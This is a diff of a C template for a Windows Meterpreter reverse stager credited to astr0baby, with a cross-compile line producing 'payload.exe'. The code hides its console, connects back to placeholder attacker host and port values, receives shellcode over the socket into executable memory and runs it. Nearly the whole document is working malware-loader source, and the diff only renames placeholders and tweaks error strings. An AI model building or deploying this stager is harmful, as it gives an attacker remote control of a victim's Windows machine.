@@ -1,27 +1,20 @@
-// C template | Author: Ast0Baby
-// https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/
-// ---
-
-
+// Credits:: astr0baby C template
+// Compile:: i686-w64-mingw32-gcc astrobaby.c -o payload.exe -lws2_32 -mwindows
+// --
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 
-
-unsigned char server[]=
-"IpADr3";
-
-unsigned char serverp[]=
-"P0rT";
-
+unsigned char server[]="LhOsT";
+unsigned char serverp[]="lPoRt";
 void winsock_init() {
     WSADATA    wsaData;
     WORD    wVersionRequested;
     wVersionRequested = MAKEWORD(2, 2);
     if (WSAStartup(wVersionRequested, &wsaData) < 0) {
-         printf("bad\n"); 
+         printf("[x] bad\n"); 
          WSACleanup(); 
         exit(1);
     }
@@ -41,7 +34,7 @@ void winsock_init() {
         startb += nret;
         tret   += nret;
          if (nret == SOCKET_ERROR)
-            punt(my_socket, "no data");
+            punt(my_socket, "[x] no data");
     }
     return tret;
 }
@@ -64,6 +57,7 @@ SOCKET wsconnect(char * targetip, int port) {
 }
 int main(int argc, char * argv[]) {
   FreeConsole();
+    Sleep(10);
     ULONG32 size;
     char * buffer;
     void (*function)();
@@ -71,10 +65,10 @@ int main(int argc, char * argv[]) {
     SOCKET my_socket = wsconnect(server, atoi(serverp));
     int count = recv(my_socket, (char *)&size, 4, 0);
     if (count != 4 || size <= 0)
-        punt(my_socket, "error lenght\n");
+        punt(my_socket, "[x] error lenght\n");
     buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (buffer == NULL)
-        punt(my_socket, "error in buf\n");
+        punt(my_socket, "[x] error in buf\n");
     buffer[0] = 0xBF;
     memcpy(buffer + 1, &my_socket, 4);
     count = recv_all(my_socket, buffer + 5, size);
